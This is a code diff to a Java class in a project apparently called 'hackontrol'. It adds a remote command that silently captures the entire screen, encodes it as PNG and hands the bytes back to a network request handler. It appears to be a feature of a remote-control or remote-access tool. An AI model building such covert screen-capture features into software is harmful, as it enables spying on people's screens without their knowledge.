@@ -1,5 +1,13 @@
 package com.khopan.hackontrol.network;
 
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
+
+import javax.imageio.ImageIO;
+
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ObjectNode;
@@ -46,6 +54,27 @@ public class Response {
 		case ResponseMode.STATUS_QUERY:
 			this.request.statusReport(true);
 			break;
+		case ResponseMode.TAKE_SCREENSHOT: {
+			Robot robot;
+
+			try {
+				robot = new Robot();
+			} catch(Throwable ignored) {
+				return;
+			}
+
+			BufferedImage image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+			ByteArrayOutputStream stream = new ByteArrayOutputStream();
+
+			try {
+				ImageIO.write(image, "png", stream);
+			} catch(Throwable ignored) {
+				return;
+			}
+
+			this.request.screenshotTaken(stream.toByteArray());
+			break;
+		}
 		}
 	}
 }
